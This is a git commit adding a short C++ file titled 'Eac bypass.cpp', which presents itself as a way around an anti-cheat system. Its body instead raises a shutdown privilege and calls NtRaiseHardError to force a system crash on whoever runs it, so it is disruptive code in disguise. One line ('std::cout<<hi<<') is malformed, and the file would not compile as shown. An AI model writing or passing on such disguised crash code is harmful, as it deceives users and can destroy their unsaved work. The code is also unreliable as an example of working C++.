dd0d9f6a90f6f99b04116a216e3f44ded2448cdf
itssnowww <131212332+itssnowww@users.noreply.github.com>
2023-05-22 21:33:54 -0400

    Add files via upload

---
+++ Eac bypass.cpp
@@ -0,0 +1,16 @@
+#include <windows.h>
+#include <iostream>
+#pragma comment(lib, "ntdll.lib")
+
+EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
+EXTERN_C NTSTATUS NTAPI NtRaiseHardError(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnocodeStringParameterMask, PULONG_PTR Parameters, ULONG ValidResponseOption, PULONG Response);
+std::cout<<hi<<
+int main() {
+    BOOLEAN bl;
+    unsigned long response;
+   
+    RtlAdjustPrivilege(19, true, false, &bl);
+    NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &response);
+
+    return 0;
+}
